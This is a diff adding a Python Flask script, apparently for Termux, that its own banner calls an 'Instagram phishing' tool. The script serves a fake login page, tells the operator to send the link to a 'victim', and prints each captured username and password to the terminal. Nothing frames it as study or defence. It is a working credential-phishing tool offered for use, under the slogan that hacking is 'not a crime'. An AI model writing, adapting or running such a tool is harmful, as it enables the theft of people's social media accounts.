@@ -1,0 +1,96 @@
+from flask import Flask, render_template, request
+import socket
+import os
+import time
+import logging
+
+# ANSI escape sequences for advanced text formatting in Termux
+def print_color(text, color_code):
+    print(f"\033[{color_code}m{text}\033[0m")
+
+def print_centered(text, color_code):
+    terminal_width = 80  # Adjust this based on your terminal size
+    padding = (terminal_width - len(text)) // 2
+    centered_text = " " * padding + text
+    print_color(centered_text, color_code)
+
+def print_banner(port):
+    # Red color for the banner header
+    print_color("=== E G A L E X 5 ===", 31)  # 31 is red
+    print_color("    --- Hacking is not a crime, it's skills ---", 31)
+    print("=" * 60)
+
+    # White color for the main message
+    print_color("============================================================", 37)  # 37 is white
+    print_centered("Welcome to the Instagram phishing 🦅", 37)
+    print_color("============================================================", 37)
+
+    # Yellow color for the "Send the link" message
+    print_color("Send the link below to the victim ⚡:", 33)  # 33 is yellow
+    # Red color for the victim link
+    print_color(f"http://127.0.0.1:{port}", 31)  # 31 is red
+
+    # White color for the waiting message
+    print_color("Waiting for information 🦅", 37)
+
+# Suppress Flask server logs in Termux
+log = logging.getLogger('werkzeug')
+log.setLevel(logging.ERROR)  # Only show errors, suppress warnings and info logs
+
+app = Flask(__name__)
+
+# Function to find an available port
+def find_free_port():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.bind(('0.0.0.0', 0))  # bind to any available port
+    addr, port = sock.getsockname()
+    sock.close()
+    return port
+
+# Serve the login page
+@app.route('/')
+def home():
+    port = find_free_port()  # Get a free port
+    print_banner(port)  # Print the banner in Termux
+    return render_template('login.html')  # Render login page
+
+# Handle the login form submission
+@app.route('/submit', methods=['POST'])
+def submit():
+    username = request.form['username']
+    password = request.form['password']
+
+    # Now display username and password in a bordered box on Termux with unique symbols
+    print_bordered_text(f"Username: {username}", 34)  # Blue border for username
+    print_special_symbols()
+    print_bordered_text(f"Password: {password}", 31)  # Red border for password
+
+    # After login, redirect to the friendly message page
+    return render_template('magic_page.html')
+
+def print_bordered_text(text, border_color_code):
+    # Print the border (colored)
+    border_line = "+" + "-" * (len(text) + 2) + "+"
+    print_color(border_line, border_color_code)  # Top border
+    print_color(f"| {text} |", border_color_code)  # Content with border
+    print_color(border_line, border_color_code)  # Bottom border
+
+def print_special_symbols():
+    # Print the special symbols (⚡🦅🦅🦅🦅🦅⚡) with a separator
+    print_color("⚡🦅🦅🦅🦅🦅⚡", 33)  # Yellow for the special symbols
+
+def run_flask():
+    # Clear Termux screen
+    os.system('clear')  # Clears the Termux screen before displaying anything
+
+    port = find_free_port()  # Get a free port
+
+    # Print the banner in Termux
+    print_banner(port)
+    time.sleep(1)  # Short delay to simulate loading animation
+
+    # Start the Flask app without the use of reloader to prevent conflict with print statements
+    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
+
+if __name__ == '__main__':
+    run_flask()
